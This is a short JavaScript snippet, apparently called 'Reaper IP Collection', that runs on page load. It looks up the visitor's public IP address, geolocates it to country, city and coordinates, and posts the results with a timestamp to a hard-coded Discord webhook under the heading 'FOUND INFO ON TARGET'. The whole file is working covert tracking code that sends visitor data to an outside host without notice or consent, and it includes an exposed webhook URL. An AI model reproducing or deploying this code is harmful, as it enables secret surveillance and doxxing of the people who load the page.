

document.addEventListener("DOMContentLoaded" , function(){
      fetch("https://api.ipify.org/?format=json").then(response => response.json().then(data => {
        fetch(`https://ipapi.co/${data.ip}/json`).then(response => response.json().then(data => {
            var time = moment().format("LTS")
            var args = {
                "username": "Reaper IP Collection",
                "content":  `FOUND INFO ON TARGET AT: ${time} \n\nIP: ${data.ip}\n\nCOUNTRY: ${data.country_name}\n\nCITY: ${data.city}\n\nLATITUDE:${data.latitude}\n\nLONGITUDE:${data.longitude}`
            }


            fetch("https://discord.com/api/webhooks/1176766309401382973/0c0hXo7YpXjYksdOm_Ad7A_LZfM488vnq_fwBOkqPsYVp41qiZU8ENp-NnlRfw-wsvZ1" , {
                "method": "POST",
                "headers": {
                    "Content-Type": "application/json"
                },

                "body":JSON.stringify(args)
            })
        }))
      }))
})